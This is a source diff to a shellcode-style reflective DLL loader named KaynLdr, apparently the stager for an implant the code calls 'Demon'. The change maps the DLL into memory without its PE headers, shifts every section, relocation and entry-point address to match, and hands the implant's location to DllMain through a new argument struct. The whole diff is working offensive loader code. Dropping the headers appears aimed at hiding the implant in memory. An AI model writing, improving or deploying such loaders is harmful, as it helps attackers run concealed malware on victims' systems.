@@ -16,11 +16,13 @@ SEC( text, B ) VOID Entry( VOID )
     PIMAGE_SECTION_HEADER   SecHeader       = NULL;
     LPVOID                  KVirtualMemory  = NULL;
     DWORD                   KMemSize        = 0;
+    DWORD                   KHdrSize        = 0;
     PVOID                   SecMemory       = NULL;
     PVOID                   SecMemorySize   = 0;
     DWORD                   Protection      = 0;
     ULONG                   OldProtection   = 0;
     PIMAGE_DATA_DIRECTORY   ImageDir        = NULL;
+    KAYN_ARGS               KaynArgs        = { 0 };
 
     // 0. First we need to get our own image base
     KaynLibraryLdr          = KaynCaller();
@@ -31,32 +33,34 @@ SEC( text, B ) VOID Entry( VOID )
     Instance.Win32.NtProtectVirtualMemory  = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY );
 
     NtHeaders = C_PTR( KaynLibraryLdr + ( ( PIMAGE_DOS_HEADER ) KaynLibraryLdr )->e_lfanew );
-    KMemSize  = NtHeaders->OptionalHeader.SizeOfImage;
+    SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
+    KHdrSize  = SecHeader[ 0 ].VirtualAddress;
+    KMemSize  = NtHeaders->OptionalHeader.SizeOfImage - KHdrSize;
 
     if ( NT_SUCCESS( Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &KVirtualMemory, 0, &KMemSize, MEM_COMMIT, PAGE_READWRITE ) ) )
     {
-        MemCopy(
-            KVirtualMemory,
-            KaynLibraryLdr,
-            NtHeaders->OptionalHeader.SizeOfHeaders);
+        // TODO: find the base address of this shellcode in a better way?
+        KaynArgs.KaynLdr   = ( PVOID ) ( ( ( ULONG_PTR )KaynLibraryLdr ) & ( ~ ( PAGE_SIZE - 1 ) ) );
+        KaynArgs.DllCopy   = KaynLibraryLdr;
+        KaynArgs.Demon     = KVirtualMemory;
+        KaynArgs.DemonSize = KMemSize;
 
-        SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
         for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
         {
             MemCopy(
-                    C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress ),    // Section New Memory
-                    C_PTR( KaynLibraryLdr + SecHeader[ i ].PointerToRawData ),  // Section Raw Data
-                    SecHeader[ i ].SizeOfRawData                                // Section Size
+                C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize ), // Section New Memory
+                C_PTR( KaynLibraryLdr + SecHeader[ i ].PointerToRawData ),          // Section Raw Data
+                SecHeader[ i ].SizeOfRawData                                        // Section Size
             );
         }
 
         ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
         if ( ImageDir->VirtualAddress )
-            KaynLdrReloc( KVirtualMemory, NtHeaders->OptionalHeader.ImageBase, C_PTR( KVirtualMemory + ImageDir->VirtualAddress ) );
+            KaynLdrReloc( KVirtualMemory, NtHeaders->OptionalHeader.ImageBase, C_PTR( KVirtualMemory + ImageDir->VirtualAddress ), KHdrSize );
 
         for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
         {
-            SecMemory       = C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress );
+            SecMemory       = C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize );
             SecMemorySize   = SecHeader[ i ].SizeOfRawData;
             Protection      = 0;
             OldProtection   = 0;
@@ -88,15 +92,15 @@ SEC( text, B ) VOID Entry( VOID )
         // --------------------------------
         // 6. Finally executing our DllMain
         // --------------------------------
-        BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint );
-        KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, KaynLibraryLdr );
+        BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
+        KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );
     }
 }
 
-VOID KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir )
+VOID KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWORD KHdrSize )
 {
-    PIMAGE_BASE_RELOCATION  pImageBR = C_PTR( BaseRelocDir );
-    LPVOID                  OffsetIB = C_PTR( U_PTR( KaynImage ) - U_PTR( ImageBase ) );
+    PIMAGE_BASE_RELOCATION  pImageBR = C_PTR( BaseRelocDir - KHdrSize );
+    LPVOID                  OffsetIB = C_PTR( U_PTR( KaynImage - KHdrSize ) - U_PTR( ImageBase ) );
     PIMAGE_RELOC            Reloc    = NULL;
 
     while( pImageBR->VirtualAddress != 0 )
@@ -106,7 +110,7 @@ VOID KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir )
         while ( ( PBYTE ) Reloc != ( PBYTE ) pImageBR + pImageBR->SizeOfBlock )
         {
             if ( Reloc->type == IMAGE_REL_TYPE )
-                *( ULONG_PTR* ) ( U_PTR( KaynImage ) + pImageBR->VirtualAddress + Reloc->offset ) += ( ULONG_PTR ) OffsetIB;
+                *( ULONG_PTR* ) ( U_PTR( KaynImage ) + pImageBR->VirtualAddress + Reloc->offset - KHdrSize ) += ( ULONG_PTR ) OffsetIB;
 
             else if ( Reloc->type != IMAGE_REL_BASED_ABSOLUTE )
                 __debugbreak(); // TODO: handle this error
